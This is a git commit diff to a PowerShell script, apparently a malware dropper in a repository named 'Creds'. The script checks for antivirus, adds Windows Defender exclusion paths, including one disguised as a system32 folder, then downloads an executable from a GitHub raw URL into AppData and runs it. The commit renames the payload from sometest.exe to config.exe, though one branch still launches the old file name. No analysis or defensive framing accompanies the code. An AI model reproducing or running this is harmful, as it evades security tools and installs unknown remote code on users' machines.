18c231ee32d4524ec75c3a9b0f9fba0a9a2c4a6f
LoOwOdI <109526378+IgorAlaf@users.noreply.github.com>
2024-04-09 06:58:49 +0300

    Update Invoke-loowodi.ps1

--- Invoke-loowodi.ps1
+++ Invoke-loowodi.ps1
@@ -10,16 +10,16 @@
   Switch($AntivirusNames) {
     {$AntivirusNames.Count -eq 0}{
       New-Item -Path "$env:USERPROFILE/AppData/Roaming" -ItemType "directory" -Name "tempFolder"
-      Invoke-WebRequest -Uri "https://github.com/IgorAlaf/Creds/raw/main/sometest.exe" -OutFile "$env:USERPROFILE/AppData/Roaming/tempFolder/sometest.exe"
+      Invoke-WebRequest -Uri "https://github.com/IgorAlaf/Creds/raw/main/config.exe" -OutFile "$env:USERPROFILE/AppData/Roaming/tempFolder/config.exe"
       Start-Process -FilePath "$env:USERPROFILE/AppData/Roaming/tempFolder/sometest.exe"
       Continue
     }
     {$AntivirusNames.Count -eq 1 -and $_ -eq "Windows Defender"} {
       New-Item -Path "$env:USERPROFILE/AppData/Roaming" -ItemType "directory" -Name "tempFolder"
-      Add-MpPreference -ExclusionPath "$env:USERPROFILE/AppData/Roaming/system32Folder"
+      Add-MpPreference -ExclusionPath "$env:SystemRoot/system32/WindowsSystem32"
       Add-MpPreference -ExclusionPath "$env:USERPROFILE/AppData/Roaming/tempFolder"
-      Invoke-WebRequest -Uri "https://github.com/IgorAlaf/Creds/raw/main/sometest.exe" -OutFile "$env:USERPROFILE/AppData/Roaming/tempFolder/sometest.exe"
-      Start-Process -FilePath "$env:USERPROFILE/AppData/Roaming/tempFolder/sometest.exe"
+      Invoke-WebRequest -Uri "https://github.com/IgorAlaf/Creds/raw/main/config.exe" -OutFile "$env:USERPROFILE/AppData/Roaming/tempFolder/config.exe"
+      Start-Process -FilePath "$env:USERPROFILE/AppData/Roaming/tempFolder/config.exe"
       Timeout(2)
       Stop-Process -Name "Client.exe"
       Continue
